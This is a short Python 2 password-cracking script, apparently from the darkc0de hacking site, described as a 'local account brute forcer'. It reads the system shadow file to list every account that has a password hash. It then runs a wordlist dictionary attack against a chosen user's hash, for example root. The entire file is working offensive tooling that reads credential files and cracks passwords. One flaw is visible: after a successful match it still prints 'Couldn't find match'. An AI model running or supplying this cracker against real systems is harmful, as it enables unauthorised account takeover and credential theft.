#!/usr/bin/python
"""
Local account brute forcer.
(You need to be able to read shadow file)

http://www.darkc0de.com
d3hydr8[at]gmail[dot]com
"""

import sys
import crypt
import spwd

usage = '''
Usage: ./locbrute.py <user> <wordlist>
Ex: ./locbrute.py root words.txt

'''

def main():
	if len(sys.argv) != 3:
		print (usage)
		return

	print "\nAccounts with encrypted passwords:\n"
	users = spwd.getspall()
	for user in users:
		if user[1] not in ["*","!"]: 
			print user[:2]
	
	try:
		words = open(sys.argv[2], "r").readlines()
	except(IOError):
		print "\n[-] Error: Couldn't open wordlist\n"
			
	print "\n[+] Words Loaded:",len(words)
	try:
		passwd = spwd.getspnam(sys.argv[1])[1]
	except(KeyError):
		print "\n[-] User not found. Check list above\n"
		
	print "[+] Cracking:",passwd
	for word in words:
		word = word.replace("\n","")
		if crypt.crypt(word, passwd) == passwd:
			print "\n[!] Cracked: [ ",word," ]\n"
			
	print "\n[-] Couldn't find match\n"
	
if __name__ == '__main__':
	main()
	
